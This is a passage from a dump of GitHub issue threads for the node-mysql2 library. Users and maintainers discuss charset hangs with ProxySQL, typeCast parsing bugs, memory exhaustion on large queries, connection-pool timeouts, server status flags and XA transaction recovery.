      <Body>Hi Andrey,&#13;
&#13;
Thank you very much.&#13;
&#13;
You are indeed right. In our setup we needed to use &#8220;charsetNumber: 33&#8221; though, the &#8220;charset&#8221; was filtered out by another library.&#13;
&#13;
So I suppose this is an incompatibility in proxysql, rather than in mysql2, and the only &#8220;err&#8221; on mysql2 behalf is that it uses a different charset by default, is this correctly understood?&#13;
&#13;
We have verified that mysqljs/mysql behaves in the same way when connecting to proxysql. if you specify &#8220;UTF8MB4_UNICODE_CI&#8221;.&#13;
&#13;
Kind regards,&#13;
&#13;
Thomas&#13;
&#13;
From: Andrey Sidorov [mailto:notifications@github.com]&#13;
Subject: Re: [sidorares/node-mysql2] mysql2 query to proxysql hangs (#656)&#13;
&#13;
So after initial research we figured out that at least when charset is set to UTF8_GENERAL_CI ( same as mysqljs/mysql uses ) queries do finish</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>closing this issue for now, if it's in fact proxysql problem it'll be tracked on their side, if not I'll reopen</Body>
    </Comment>
  </Issue_495>
  <Issue_496>
    <Repository>node-mysql2</Repository>
    <Title>error while parsing: "should not reach here"</Title>
    <Owner>sidorares</Owner>
    <Body>~Snip stack:&#13;
```&#13;
    at Packet.readLengthCodedNumberExt (/node_modules/mysql2/lib/packets/packet.js:207:11)&#13;
    at Packet.readLengthCodedNumber (/node_modules/mysql2/lib/packets/packet.js:157:15)&#13;
    at Packet.parseLengthCodedInt (/node_modules/mysql2/lib/packets/packet.js:668:29)&#13;
```&#13;
&#13;
I can't tell exactly what the problem is, but it seems like there's no bounds check on the `Packet.readLengthCodedNumber` function.&#13;
&#13;
https://github.com/sidorares/node-mysql2/blob/b098d4969a000644d110e29b9aa0bee33cb1dfcb/lib/packets/packet.js#L152-L158&#13;
&#13;
if `offset` is greater than `buffer`'s length, then `byte2` is set to undefined, which breaks the rest of the code.</Body>
    <State>open</State>
    <Comment>
      <Owner>bradzacher</Owner>
      <Body>upon inspection - it seems like it occurs if you call one of the conversion functions (`string`/`buffer`/`geometry`) more than once for a field.&#13;
&#13;
If you call one a second time then it essentially triggers the buffer read again without resetting the offset, which screws up the offset for future fields.&#13;
&#13;
There should be handling in place this to prevent it (or an error message).</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks for report @bradzacher &#13;
&#13;
What's the reason you are using `typeCast` ? I agree in it's current form it's very easy to make mistake and crash everything</Body>
    </Comment>
    <Comment>
      <Owner>bradzacher</Owner>
      <Body>I use `mysql2` to access data for my company's `graphql` API.&#13;
&#13;
Right now I have two cases:&#13;
&#13;
1)&#13;
To reduce code repetition (i.e. having to copy paste a conversion function in every schema), we just handle a boolean conversion in the typecast function. We store booleans as either `TINYINT(1)` or `BIT(1)` (and we don't use those types anywhere else in the DB), so typecast checks for either of these and does a conversion to `boolean`:&#13;
```JS&#13;
if (type === 'TINY' &amp;&amp; field.length === 1) {&#13;
    return (field.string() !== '0')&#13;
} else if (type === 'BIT' &amp;&amp; field.length === 1) {&#13;
    const buf = field.buffer()&#13;
&#13;
    // handle the case where field is null&#13;
    if (buf.length &gt; 0) {&#13;
        return (buf.readInt8(0) !== 0)&#13;
    }&#13;
&#13;
    return false&#13;
}&#13;
```&#13;
&#13;
2)&#13;
We have created a custom set of date types in graphql, long story short here - when I do a custom conversion from `Date` -&gt; `string`, it has to return a non-null value.&#13;
However, if the value is null before it reaches my conversion function, graphql lets it through as null.&#13;
&#13;
Unfortunately, if you have a non-null `DATE`/`DATETIME`/etc type, which doesn't get set somehow - mysql will auto assign it the value of `0000-00-00 00:00`. When mysql2 decodes this value, it passes that string into the JS `Date` constructor, which returns `Invalid Date`.&#13;
Obviously `Invalid Date !== null`, so my custom function gets called, which can't return null.&#13;
My work around is to use `typeCast` to handle this up front (I use moment to make it easier):&#13;
```JS&#13;
const mysqlDateFormats = {&#13;
    DATETIME: 'YYYY-MM-DD HH:mm:ss',&#13;
    TIMESTAMP: 'YYYY-MM-DD HH:mm:ss',&#13;
    DATE: 'YYYY-MM-DD',&#13;
    TIME: 'HH:mm:ss',&#13;
    YEAR: 'YYYY',&#13;
}&#13;
const mysqlDateTypes = Object.keys(mysqlDateFormats)&#13;
&#13;
if (mysqlDateTypes.includes(type)) {&#13;
    const strVal = field.string()&#13;
    const parsed = moment(strVal, mysqlDateFormats[type as keyof typeof mysqlDateFormats], true)&#13;
&#13;
    if (!parsed.isValid()) {&#13;
        return null&#13;
    }&#13;
&#13;
    return parsed&#13;
}&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I think currently what we have as `typeCast` sits at wrong level. It should be at 'presentation', result building layer, not at de-serealization layer.&#13;
&#13;
Short term solutions to issues you mention: 1) add more boundary checks to all packet functions ( overall good but might slow down speed ) or 2) have special boundary checked `.string()`, `.buffer()`, `.geometry()` readers exposed to `typeCast`&#13;
&#13;
Long term solution - probably backward incompatible, add some more ways to affect presentation ( similar to `rowsAsArray` flag ) so there is no need for low level `typeCast` </Body>
    </Comment>
    <Comment>
      <Owner>bradzacher</Owner>
      <Body>Personally, I think type cast works fine where it is, because it allows you to save cycles by custom casting before `mysql2` even tries to cast.&#13;
&#13;
You probably don't need the bounds checks if you prevent multiple calls to the cast functions for a single field.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; You probably don't need the bounds checks if you prevent multiple calls to the cast functions for a single field.&#13;
&#13;
that might work actually. Still, if you call wrong function ( `geometry()` for example when string is expected ) you end up with parser in undefined state</Body>
    </Comment>
  </Issue_496>
  <Issue_497>
    <Repository>node-mysql2</Repository>
    <Title>typeCast not supported with .execute</Title>
    <Owner>sidorares</Owner>
    <Body>using typeCast option in .query works, but does not work in .execute. The field is not type casted.&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>typeCast only documented to work with `.query()`&#13;
&#13;
The aim of `typeCast()` is to 1) give access to internal raw representation of data and 2) conrol what's generated out of this raw data&#13;
&#13;
With `.execute()` this raw data is completely different ( prepared statements use so called 'binary protocol' and plain queries 'text protocol' ) &#13;
&#13;
Also I think current api of typeCast is flawed: you as consumer responsible of reading all raw data in full and in correct order. If you miss something everything breaks. </Body>
    </Comment>
    <Comment>
      <Owner>aikar</Owner>
      <Body>@sidorares I understand why it's more difficult to do, but the options really should work for both methods...&#13;
&#13;
I ultimately had to re-implement typeCast in an abstraction layer that any time .execute is called on my layer, it immediately iterates the fields response and does type conversion.&#13;
&#13;
For example, someone decided to use a VARBINARY column type for string keys in order to enforce case sensitivity (very old table before mysql supported this natively), and I now need to convert that to string.&#13;
&#13;
A solution is to simply take the fields metadata response, and rebuild the same data structure the .query based call is supplied.&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'll try to check how easy to do that, maybe actually not that difficult</Body>
    </Comment>
    <Comment>
      <Owner>javiertury</Owner>
      <Body>I am trying to make Sequelize use binded parameters [here](https://github.com/sequelize/sequelize/pull/10284). The Sequelize team prefers `node-mysql2` as a mysql driver, but unfortunately Sequelize needs typeCast() functionality.&#13;
&#13;
Also, the overall information returned by the `execute()` method is poorer than for `query()`.</Body>
    </Comment>
    <Comment>
      <Owner>javiertury</Owner>
      <Body>Apart from applying timezone, typeCast is also useful to convert geometries to geoJSON format. If it is not possible to add typeCast support for `.execute`, perhaps some of these common typeCasts can be implemented as built-in options for node-mysql2, e.g. `options.geoJSON = true`.</Body>
    </Comment>
  </Issue_497>
  <Issue_498>
    <Repository>node-mysql2</Repository>
    <Title>FATAL ERROR JavaScript heap out of memory</Title>
    <Owner>sidorares</Owner>
    <Body>I have a query that returns more than 300 thousand records in a table. My code is [Dump.ts](https://github.com/juliandavidmr/DumpMySQL/blob/master/src/dump.ts#L176).&#13;
After executing this query, the process memory collapses, &#13;
I tried to fix it with the [flags](https://github.com/juliandavidmr/DumpMySQL/blob/master/package.json#L9):&#13;
```&#13;
--max_old_space_size=6000 --optimize_for_size --max_executable_size=6000 --stack_size=6000 --trace-gc&#13;
```&#13;
&#13;
The full error is:&#13;
```&#13;
&lt;--- Last few GCs ---&gt;&#13;
&#13;
[7600:000000949173C4B0]   107414 ms: Mark-sweep 1415.4 (1500.7) -&gt; 1415.4 (1500.7) MB, 2778.0 / 0.0 ms  allocation failure scavenge might not succeed&#13;
[7600:000000949173C4B0]   110134 ms: Mark-sweep 1415.4 (1500.7) -&gt; 1415.4 (1484.7) MB, 2719.0 / 0.0 ms  last resort&#13;
[7600:000000949173C4B0]   112782 ms: Mark-sweep 1415.4 (1484.7) -&gt; 1415.4 (1484.7) MB, 2646.0 / 0.0 ms  last resort&#13;
&#13;
&#13;
&lt;--- JS stacktrace ---&gt;&#13;
&#13;
==== JS stack trace =========================================&#13;
&#13;
Security context: 000001A98441CEA9 &lt;JSObject&gt;&#13;
    0: builtin exit frame: stringify(this=000001A98442E2F9 &lt;JSON map = 000003E13070EC79&gt;,000001A984402241 &lt;undefined&gt;,000001A984402241 &lt;undefined&gt;,000002E8C122AD49 &lt;JSArr&#13;
ay[1269410]&gt;)&#13;
&#13;
    1: arguments adaptor frame: 1-&gt;3&#13;
    2: normalizeObject [C:\Users\jul.mora\Documents\GitHub\Dump\dist\dump.js:~324] [pc=0000034FD8D4050C](this=0000030E7F424F49 &lt;Dump map = 0000004357D8E121&gt;,objMysql=0000&#13;
02E8...&#13;
&#13;
FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory&#13;
error Command failed with exit code 3.&#13;
```&#13;
&#13;
thanks </Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Does this happen if you do same query in isolation? ( e.i only thing script does is connect to db, execute query and close connection )&#13;
&#13;
How much total memory you have?</Body>
    </Comment>
    <Comment>
      <Owner>juliandavidmr</Owner>
      <Body>Hi @sidorares - Connects to db, executes queries, and closes connection correctly.&#13;
&#13;
The features of my pc:&#13;
- Windows 8.1&#13;
- Node v8.4.0&#13;
- Total memory RAM: 8Gb&#13;
&#13;
_I did the same in [python and it worked](https://github.com/juliandavidmr/PyDump)_ :'(&#13;
&#13;
Thanks </Body>
    </Comment>
    <Comment>
      <Owner>sushantdhiman</Owner>
      <Body>@juliandavidmr Commit you linked to is doing a lot more that simple connect, query and fetch.&#13;
&#13;
Could you try with simpler setup (without streams and other extra code you have). Looks like there is memory leak somewhere in code and not a issue with `mysql2`</Body>
    </Comment>
    <Comment>
      <Owner>megakoresh</Owner>
      <Body>You are putting those 300 000+ rows to memory before processing them, in addition to doing that for multiple tables _at the same time_. Because you are doing it in a `rows.map(async ()=&gt;)` the VM will not wait until the previous dump is finished and will continue to the next iteration in the map for all of your rows. The promises generated will have to keep references to all results for _every single async_ callback until they _all_ complete and results consumed, which prevents the GC from collecting.&#13;
&#13;
Replace your `map` with a for loop, preferably a `for .. i` loop, so that the next row doesn't get executed until you are done processing previous row's results and see if that helps. Also if you are getting so many results, it's probably not wise to put them to memory anyway - consider using streams.&#13;
&#13;
Also it is generally not a good idea to use async functions as iteration callbacks because the underlying implementation (e.g. `Array.map`) may differ in how it calls them. Async functions return promises instantly when called without await, which means if you have 10000 elements in your array and you pass an async function to the `forEach` or `map` that will essentially execute 10000 functions in parallel, having to keep in memory every piece of data each of them accesses. Not to mention you don't get any reliable way to check if they are all finished. If you want parallelism, use `Promise.all`.</Body>
    </Comment>
  </Issue_498>
  <Issue_499>
    <Repository>node-mysql2</Repository>
    <Title>(QUESTION) Avoidance of anonymous function creation on each Connection.write invocation</Title>
    <Owner>sidorares</Owner>
    <Body>https://github.com/sidorares/node-mysql2/blob/4c1a807a5025c7fe332d0b621547e2788b876375/lib/connection.js#L248&#13;
&#13;
We create a new anonymous function for each write operation on Connection (which can be called up to 2 times, when we send header and body for large packets separately), while all it's doing is passing stream error to `connection._handleNetworkError`.&#13;
&#13;
Could we benefit from lazily binding `_handleNetworkError` to connection instance (AFAIK, `.bind()` got significantly faster, at least in recent versions of Node) and alway passing the same bound function on `.write()` invocations?&#13;
&#13;
I am just guessing here, so may be any benefits are negligible. But if it worth at least researching, I would gladly do it, if it wasn't done earlier.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>maybe, worth benchmarking. The code was mostly optimised for crankshaft, we definitely need to review those optimisations with turbofan</Body>
    </Comment>
  </Issue_499>
  <Issue_500>
    <Repository>node-mysql2</Repository>
    <Title>benchmark TextEncoder vs iconv</Title>
    <Owner>sidorares</Owner>
    <Body>node 8.3 now ships with experimental TextEncoder/TextDecoder - https://nodejs.org/dist/latest-v8.x/docs/api/util.html#util_class_util_textdecoder&#13;
&#13;
If perf is considerably better than node-iconv we could feature detect it and use instead of node-iconv when available&#13;
&#13;
/cc @sushantdhiman </Body>
    <State>open</State>
    <Comment>
      <Owner>sushantdhiman</Owner>
      <Body>Definitely if benchmarks look good we can switch to WHATWG if environment supports. Node default is built with `samll-icu` support, which doesnt support full encoding list from WHATWG.&#13;
&#13;
But I see there is a way to load these definitions runtime via ENV variable, https://nodejs.org/dist/latest-v8.x/docs/api/intl.html#intl_providing_icu_data_at_runtime</Body>
    </Comment>
  </Issue_500>
  <Issue_501>
    <Repository>node-mysql2</Repository>
    <Title>ETIMEDOUT occuring multiple times in node script then moves on.</Title>
    <Owner>sidorares</Owner>
    <Body>Here is my DB Connection  &#13;
&#13;
```&#13;
var mysql = require('mysql2'), // mysql2&#13;
&#13;
// MYSQL Connection Info:&#13;
var db_config = {&#13;
 connectionLimit: 10,&#13;
 waitForConnections: true,&#13;
    host: 'a.server.our.in.the.cloud.us-west-2.rds.amazonaws.com',&#13;
    port: '3306',&#13;
    user: 'XXXXXXXX',&#13;
    password: 'XXXXXXXX',&#13;
    database: 'DB'&#13;
};&#13;
 &#13;
var connection = mysql.createPool(db_config);&#13;
&#13;
connection.on('error', function(err){&#13;
 console.error('mysql Error', err);&#13;
});&#13;
```&#13;
&#13;
&#13;
Literally (half - 1) of my pool connections timeout about 2-5 minutes after starting my script with the error:&#13;
```&#13;
{ Error: connect ETIMEDOUT&#13;
    at PoolConnection.Connection._handleTimeoutError (C:\nodeCode\FTPWatcher\node_modules\mysql2\lib\connection.js:188:13)&#13;
    at ontimeout (timers.js:386:14)&#13;
    at tryOnTimeout (timers.js:250:5)&#13;
    at Timer.listOnTimeout (timers.js:214:5)&#13;
  errorno: 'ETIMEDOUT',&#13;
  code: 'ETIMEDOUT',&#13;
  syscall: 'connect',&#13;
  fatal: true }&#13;
```&#13;
 When I had 100 for my connection pool 49 Errors, When I have 50 connections, 24 Errors, when I did 10, 4 errors.&#13;
Did The rest of the pool connect successfully?&#13;
What about the queries that initiated the connection from my pool? Did they die to never reach my DB? &#13;
&#13;
Version of mysql2 I am using&#13;
mysql2@1.3.5&#13;
node v 6.11.0</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Interesting&#13;
Can you enable debug? It feels that 2x as much connections actually trying to connect ( or maybe increment connected queue length, idk ), very curious about 49 / 24 / 4 numbers&#13;
&#13;
Do you have correct security group settings ( e.i are you able to connect from the same box using some other client - mysql cli / mysql workbench etc ) ? Is another half able to perform query?</Body>
    </Comment>
    <Comment>
      <Owner>PsyTae</Owner>
      <Body>We are able to connect using heidi sql from the same box with the connection information the same, without any issues.</Body>
    </Comment>
    <Comment>
      <Owner>PsyTae</Owner>
      <Body>Also, the pool re-establishes the connections about 1 minute later and the script continues running as normal and expected after that reconnect.</Body>
    </Comment>
    <Comment>
      <Owner>mavrick</Owner>
      <Body>Could this be related to: https://github.com/sequelize/sequelize/issues/7884&#13;
&#13;
Having connection issues with mysql boxes via sequelize on aws rds</Body>
    </Comment>
  </Issue_501>
  <Issue_502>
    <Repository>node-mysql2</Repository>
    <Title>What is the difference between server status 34 and 35 on update/execute result?</Title>
    <Owner>sidorares</Owner>
    <Body>## Context&#13;
&#13;
We are facing a weird bug with version 1.1.1 of this library where the first read after an update (even with transaction/commit) reads the old row, more details on this stack overflow [thread](https://stackoverflow.com/questions/44647619/old-values-being-read-from-a-row-after-update-on-first-read).&#13;
&#13;
This is more of a question than an issue. After adding more logs to the whole operation we found that whenever this case of old value being read from the db happens the update before the read gives back:&#13;
&#13;
```&#13;
[ ResultSetHeader { fieldCount: 0, affectedRows: 1, insertId: 0, info: '(Rows matched: 1 Changed: 1 Warnings: 0', serverStatus: 35, warningStatus: 0, changedRows: 1 }, undefined ]&#13;
```&#13;
On updates without the problem the `severStatus:34` is seen.&#13;
&#13;
I googled and tried finding it in the mysql [protocol docs](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_PROTOCOL.html) but there was nothing there. I even looked at the older version of the [docs](http://web.archive.org/web/20160604101918/http://dev.mysql.com/doc/internals/en/status-flags.html) but there is no mention of 34 or 35.  The hex values go from 32 to 64. &#13;
&#13;
The server status 35 is the only lead I have in this bug. If anyone has faced this kind of an issue please help.</Body>
    <State>open</State>
    <Comment>
      <Owner>dougwilson</Owner>
      <Body>The server status is a bit map of flags. The difference between 34 and 35 is SERVER_STATUS_IN_TRANS where 34 that flag is not set and 35 it is set.&#13;
&#13;
That flag indicates if the query was made within a transaction.</Body>
    </Comment>
    <Comment>
      <Owner>geshan</Owner>
      <Body>Thanks for the help.</Body>
    </Comment>
  </Issue_502>
  <Issue_503>
    <Repository>node-mysql2</Repository>
    <Title>How to recover closed connection after XA_RBTIMEOUT?</Title>
    <Owner>sidorares</Owner>
    <Body>My program got XA_RBTIMEOUT error:&#13;
```&#13;
**failed { Error: XA_RBTIMEOUT: Transaction branch was rolled back: took too long**&#13;
2017-05-29 06:02:34|109545|ERROR|    at Packet.asError (/userver/bin/src/node_modules/mysql2/lib/packets/packet.js:667:13)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Query.Command.execute (/userver/bin/src/node_modules/mysql2/lib/commands/command.js:29:22)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Connection.handlePacket (/userver/bin/src/node_modules/mysql2/lib/connection.js:417:28)&#13;
2017-05-29 06:02:34|109545|ERROR|    at PacketParser.onPacket (/userver/bin/src/node_modules/mysql2/lib/connection.js:93:16)&#13;
2017-05-29 06:02:34|109545|ERROR|    at PacketParser.executeStart (/userver/bin/src/node_modules/mysql2/lib/packet_parser.js:73:14)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Socket.&lt;anonymous&gt; (/userver/bin/src/node_modules/mysql2/lib/connection.js:101:29)&#13;
2017-05-29 06:02:34|109545|ERROR|    at emitOne (events.js:96:13)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Socket.emit (events.js:191:7)&#13;
2017-05-29 06:02:34|109545|ERROR|    at readableAddChunk (_stream_readable.js:178:18)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Socket.Readable.push (_stream_readable.js:136:10)&#13;
2017-05-29 06:02:34|109545|ERROR|    at TCP.onread (net.js:561:20) **code: 'ER_XA_RBTIMEOUT', errno: 1613, sqlState: '#XA106' }**&#13;
2017-05-29 06:02:34|109545|ERROR|Sun, 28 May 2017 22:02:34 GMT knex:client releasing connection to pool: __knexUid82&#13;
2017-05-29 06:02:34|109545|ERROR|Sun, 28 May 2017 22:02:34 GMT knex:pool INFO pool mysql:mysql2:client0 - dispense() clients=6 available=1&#13;
2017-05-29 06:02:34|109545|ERROR|Sun, 28 May 2017 22:02:34 GMT knex:client acquired connection from pool: __knexUid82&#13;
2017-05-29 06:02:34|109545|ERROR|Sun, 28 May 2017 22:02:34 GMT knex:query select my_sql_query&#13;
2017-05-29 06:02:34|109545|ERROR|Sun, 28 May 2017 22:02:34 GMT knex:bindings [ '183', 'xxxx', '*', 2000 ]&#13;
```&#13;
After that moment, all sql query on this process failed because  `Can't add new command when connection is in closed state`&#13;
```&#13;
2017-05-29 06:02:34|109545|ERROR| **{ Error: Can't add new command when connection is in closed state**&#13;
2017-05-29 06:02:34|109545|ERROR|    at Connection._addCommandClosedState (/userver/bin/src/node_modules/mysql2/lib/connection.js:145:13)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Connection.query (/userver/bin/src/node_modules/mysql2/lib/connection.js:515:15)&#13;
2017-05-29 06:02:34|109545|ERROR|    at /userver/bin/src/node_modules/knex/lib/dialects/mysql/index.js:152:18&#13;
2017-05-29 06:02:34|109545|ERROR|    at Promise._execute (/userver/bin/src/node_modules/bluebird/js/release/debuggability.js:300:9)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Promise._resolveFromExecutor (/userver/bin/src/node_modules/bluebird/js/release/promise.js:483:18)&#13;
2017-05-29 06:02:34|109545|ERROR|    at new Promise (/userver/bin/src/node_modules/bluebird/js/release/promise.js:79:10)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Client_MySQL2._query (/userver/bin/src/node_modules/knex/lib/dialects/mysql/index.js:146:12)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Client_MySQL2.query (/userver/bin/src/node_modules/knex/lib/client.js:197:17)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Runner.&lt;anonymous&gt; (/userver/bin/src/node_modules/knex/lib/runner.js:146:36)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Runner.tryCatcher (/userver/bin/src/node_modules/bluebird/js/release/util.js:16:23)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Runner.query (/userver/bin/src/node_modules/bluebird/js/release/method.js:15:34)&#13;
2017-05-29 06:02:34|109545|ERROR|    at /userver/bin/src/node_modules/knex/lib/runner.js:65:21&#13;
2017-05-29 06:02:34|109545|ERROR|    at tryCatcher (/userver/bin/src/node_modules/bluebird/js/release/util.js:16:23)&#13;
2017-05-29 06:02:34|109545|ERROR|    at /userver/bin/src/node_modules/bluebird/js/release/using.js:185:26&#13;
2017-05-29 06:02:34|109545|ERROR|    at tryCatcher (/userver/bin/src/node_modules/bluebird/js/release/util.js:16:23)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Promise._settlePromiseFromHandler (/userver/bin/src/node_modules/bluebird/js/release/promise.js:512:31)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Promise._settlePromise (/userver/bin/src/node_modules/bluebird/js/release/promise.js:569:18)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Promise._settlePromise0 (/userver/bin/src/node_modules/bluebird/js/release/promise.js:614:10)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Promise._settlePromises (/userver/bin/src/node_modules/bluebird/js/release/promise.js:693:18)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Promise._fulfill (/userver/bin/src/node_modules/bluebird/js/release/promise.js:638:18)&#13;
2017-05-29 06:02:34|109545|ERROR|    at PromiseArray._resolve (/userver/bin/src/node_modules/bluebird/js/release/promise_array.js:126:19)&#13;
2017-05-29 06:02:34|109545|ERROR|    at PromiseArray._promiseFulfilled (/userver/bin/src/node_modules/bluebird/js/release/promise_array.js:144:14)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Promise._settlePromise (/userver/bin/src/node_modules/bluebird/js/release/promise.js:574:26)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Promise._settlePromise0 (/userver/bin/src/node_modules/bluebird/js/release/promise.js:614:10)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Promise._settlePromises (/userver/bin/src/node_modules/bluebird/js/release/promise.js:693:18)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Async._drainQueue (/userver/bin/src/node_modules/bluebird/js/release/async.js:133:16)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Async._drainQueues (/userver/bin/src/node_modules/bluebird/js/release/async.js:143:10)&#13;
2017-05-29 06:02:34|109545|ERROR|    at Immediate.Async.drainQueues (/userver/bin/src/node_modules/bluebird/js/release/async.js:17:14) fatal: true }&#13;
2017-05-29 06:02:34|109545|ERROR|Sun, 28 May 2017 22:02:34 GMT knex:client releasing connection to pool: __knexUid82&#13;
2017-05-29 06:02:34|109545|ERROR|Sun, 28 May 2017 22:02:34 GMT knex:pool INFO pool mysql:mysql2:client0 - dispense() clients=2 available=1&#13;
```&#13;
I think mysql2 may be a way to recover connection from XA timeout error, or how can I reconnect to mysql/reopen the connection programmatically.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Preferred way is to use connections pool.&#13;
&#13;
It's not possible to re-connect existing connection instance, you must discard it and create new one (if you are using pool this happens automatically)&#13;
&#13;
Note that some errors are not 'critical' and you can just continue to issue commands to same connection after error in that case. You can check this using `error.isFatal` flag. You you believe you have example where this flag is set incorrectly please let us know</Body>
    </Comment>
    <Comment>
      <Owner>magicxie</Owner>
      <Body>thanks @sidorares &#13;
in fact it is acquired by a connection pool, I should check the pool lib. </Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@magicxie is there any way to reduce to some smaller case I can reproduce?&#13;
&#13;
Usually you get `Can't add new command when connection is in closed state` error when you close the pool and after that some other code tries to get connection from it</Body>
    </Comment>
    <Comment>
      <Owner>magicxie</Owner>
      <Body>My program uses Knex, set up connection pool internally by generic-pool, connect to a cloud mysql(not sure it is maria or mysql)&#13;
Now I'm trying reproduce it on my dev machine, once it is done I will send the case to you.&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>novemberborn</Owner>
      <Body>I think the problem is that `mysql2` transitions connections to a broken state, and the dialect in Knex does not recognize this. As such this is a problem with Knex, see https://github.com/tgriesser/knex/pull/2175 which seems to fix it for me.</Body>
    </Comment>
    <Comment>
      <Owner>yunfan</Owner>
      <Body>i had met this problem too, since its still open state, were there any recommendation with less code changing?</Body>
    </Comment>
  </Issue_503>
  <Issue_504>
    <Repository>node-mysql2</Repository>
    <Title>unable to end the mysql connection using the mysql2 promise</Title>
    <Owner>sidorares</Owner>
    <Body>Followings are my piece of code, please have a look into it.&#13;
&#13;
```js&#13;
var mysql = require('promise-mysql');&#13;
            var connection;&#13;
&#13;
            mysql.createConnection({host:'Ip', user:'qa', password: '******'}).then(function(conn){&#13;
                connection = conn;&#13;
                return connection.query(firstInput);&#13;
            })&#13;
                .then(function(rows){&#13;
 console.log(rows);&#13;
})&#13;
                .then(function(){&#13;
                console.log("End of DB Con.");&#13;
                return connection.end();&#13;
                &#13;
            })&#13;
                .catch(function(error){&#13;
                //logs out the error&#13;
                console.log(error);&#13;
            });&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>is that using https://www.npmjs.com/package/promise-mysql ?&#13;
if yes, looks like mysql2 is not used</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>what error are you getting?</Body>
    </Comment>
    <Comment>
      <Owner>abidrana7</Owner>
      <Body>@sidorares &#13;
This issue appearing for both mysql2 as well as promise-mysql.&#13;
&#13;
Once I try to execute the code for different Jasmine tests all works Ok as it's fetch the records from DB but when it comes to executing the last jasmine test it retain the records from second last query that was executed in second last test. This is the exact problem!&#13;
&#13;
I have to applied the ASSERTION in jasmine tests based on the followings factors:&#13;
1) Got Browser based PHPSESSID by using Protractor-Jasmine &#13;
2) Got the PHPSESSID stored in DB by using mysql2 as well as promise-mysql&#13;
And I have compared for all test, except the last one where it retain PHPSESSID fetch form second last test. That's why my jasmine tests gets failed.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>```js&#13;
 //logs out the error&#13;
 console.log(error);&#13;
```&#13;
&#13;
which error are you getting @abidrana7 ? It's still very unclear to me what is the problem</Body>
    </Comment>
    <Comment>
      <Owner>abidrana7</Owner>
      <Body>@sidorares &#13;
No, Im not getting any error message from this statement: &#13;
//logs out the error&#13;
 console.log(error);&#13;
&#13;
Followings my piece of code of fetching the records from DB:&#13;
&#13;
1) First function related to DB connection and Query:&#13;
&#13;
               function dbMySqlInteraction (query, callback) {&#13;
              Promise = require('bluebird');&#13;
              var mysql = Promise.promisifyAll(require('mysql'));&#13;
              var connection = mysql.createConnection({host:'ip', user:'qa', password: '*********'});&#13;
              connection.query(query, function (err, results, fields) {&#13;
                callback(results);&#13;
              }); &#13;
&#13;
2) Below mentioned code will print the records fetched from db and then PHPSESSID comparison:&#13;
                &#13;
               dbMySqlInteraction(query, function(cBT){&#13;
&#13;
                var lastRow = cBT[cBT.length-1];&#13;
&#13;
                ////////////////// Print Stats ////////////////////////////////&#13;
                //console.log(lastRow.stats_datetime);&#13;
                console.log('Stats recorded/fetched from DB as: ');&#13;
                allure.createStep('Stats recorded/fetched from DB as: ', function(){&#13;
&#13;
                    for (var key in lastRow) {&#13;
                        if (lastRow.hasOwnProperty(key)) {&#13;
                            allure.createStep(key +': ' + lastRow[key], function(){})();&#13;
                            console.log(key +': ' + lastRow[key]);&#13;
                        }&#13;
                    }&#13;
                })();&#13;
&#13;
                browser.sleep(2000);&#13;
                ////////////////// PHPSESSID Comparison ///////////////////////////////&#13;
                browser.manage().getCookie("PHPSESSID").then(function(cookies) {&#13;
                    console.log('Got Browser PHPSESSID As: ', cookies.value);&#13;
                    allure.createStep('Got Browser PHPSESSID As: ' + cookies.value, function(){})();&#13;
&#13;
                    var dBSessionID = lastRow.session_id;&#13;
&#13;
                    console.log("DB Session ID: " + dBSessionID);&#13;
                    allure.createStep("DB Session ID: " + dBSessionID, function(){})();&#13;
&#13;
                    console.log('Stats recorded time: ' + lastRow.stats_datetime);&#13;
                    allure.createStep('Stats recorded time: ' + lastRow.stats_datetime, function(){})();&#13;
&#13;
                    expect(cookies.value).toEqual(dBSessionID);&#13;
                });&#13;
            });&#13;
            //connection.end();&#13;
            browser.sleep(2000);&#13;
&#13;
I need to execute all above mentioned code as a part of each jasmine test (Where I need to click on CALL button using Protractor, once clicked records will be inserted in DB right away) but sometime "dBSessionID" fetch from earlier Jasmine test will retain itself in coming jasmine test and according to assertion it will be marked as failed due to NOT equal to PHPSESSID of browser.</Body>
